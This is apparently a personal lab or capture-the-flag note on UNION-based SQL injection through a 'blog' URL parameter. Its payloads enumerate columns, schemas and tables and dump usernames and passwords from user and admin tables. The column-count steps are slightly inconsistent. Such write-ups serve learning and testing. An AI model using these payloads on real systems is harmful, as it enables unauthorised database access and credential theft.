@
Testing for SQLI and determining columns:
blog=1 UNION SELECT NULL--
![[Pasted image 20251102210008.png]]
blog=1 UNION SELECT NULL,NULL--
![[Pasted image 20251102210013.png]]
blog=1 UNION SELECT NULL,NULL--
![[Pasted image 20251102210019.png]]
AND BAM, We can see it's reflecting our response in this UNION query. 
So we now know this is vulnerable to SQLI injection and that it contains 3 columns. 

?blog=-23232 union select null,null,@@version--
![[Pasted image 20251102210024.png]]

By using a page that doesn't exist in the blog paramater, the MySQL resposnse gets reflected in the status section
![[Pasted image 20251102210033.png]]

As you can see; this is not the information we seek. 
![[Pasted image 20251102210037.png]]

?blog=-51512 UNION SELECT null, username, password from users--
![[Pasted image 20251102210043.png]]

?blog=-51512 union select NULL, NULL, group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata--
![[Pasted image 20251102210049.png]]

Very interesting technique. 



?blog=-51512 union select NULL, NULL, group_concat(password) from users--
![[Pasted image 20251102210055.png]]


?blog=-51512 union select NULL, group_concat(username), group_concat(password) from users--
![[Pasted image 20251102210059.png]]
?blog=-51512 union select NULL,NULL,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='vn_admin'--
![[Pasted image 20251102210106.png]]

?blog=-51512 union select NULL, NULL, group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='vn_admin'--
![[Pasted image 20251102210111.png]]

?blog=-51512 union select NULL,NULL,group_concat(username) from vn_admin.be_users--
![[Pasted image 20251102210116.png]]

?blog=-51512 union select NULL,NULL,group_concat(password) from vn_admin.be_users--
![[Pasted image 20251102210122.png]]